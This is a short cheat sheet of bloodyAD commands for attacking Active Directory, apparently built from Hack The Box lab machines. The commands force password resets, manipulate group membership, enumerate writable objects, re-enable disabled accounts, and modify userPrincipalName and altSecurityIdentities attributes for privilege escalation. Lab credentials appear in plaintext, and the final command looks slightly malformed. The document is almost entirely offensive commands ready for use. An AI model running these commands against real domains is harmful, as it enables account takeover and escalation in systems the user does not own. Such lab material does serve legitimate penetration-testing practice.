# BloodyAd

**Force change passwd**

```zsh
# KERBEROS
bloodyad --host dc.hercules.htb -d hercules.htb -k set password 'auditor' 'Preetyprincess123@'

# NTLM
bloodyad --host 10.10.11.42 -u 'OLIVIA' -p 'ichliebedich' set password 'MICHAEL' 'Hexora123@'
```

**Add to Group**

```zsh
# KERBEROS
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-COMPUTER3$'
```

**Remove from Group**

```zsh
# KERBEROS
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'IT'
```

**Get Writables**

```zsh
bloodyad --host dc.hercules.htb -d hercules.htb -k get writable -detail
```

**Enable the disable user**

```zsh
bloodyad --host dc01.mirage.htb -d mirage.htb -k remove uac javier.mmarshall -f ACCOUNTDISABLE
```

**Modify user's email**

```zsh
bloodyad --host dc01.mirage.htb -d mirage.htb -k  set object mark.bbond userPrincipalName -v 'mark.bbond@mirage.htb'
```

**Modifying AltSecurityIdentities attribute for a user**

```zsh
bloodyad --host dc01.mirage.htb -d mirage.htb set object -k set object $TARGETUSER altSecurityIdentities -v 'value'
```
